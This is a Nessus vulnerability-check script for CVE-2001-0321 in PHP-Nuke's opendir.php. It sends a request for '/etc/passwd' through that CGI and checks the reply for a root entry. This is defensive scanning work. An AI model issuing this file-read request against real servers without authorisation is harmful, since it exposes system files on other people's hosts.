#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#


if (description)
{
 script_id(10655);
script_cve_id("CVE-2001-0321");
 script_version ("$Revision$");
 script_name(english:"PHP-Nuke' opendir");
 desc["english"] = "
The remote host has the CGI 'opendir.php' installed. This
CGI allows anyone to read arbitrary files with the privileges
of the web server (usually root or nobody).

Solution : upgrade your version of phpnuke
Risk factor : Serious";

 script_description(english:desc["english"]);
 script_summary(english:"Determine if a remote host is vulnerable to the opendir.php vulnerability");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison");
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


function check(url)
{
 req = http_get(item:string(url, "/opendir.php?/etc/passwd"), port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r)){
  	security_hole(port);
	exit(0);
	}
}

port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);

check(url:"");
foreach dir (cgi_dirs())
{
check(url:dir);
}
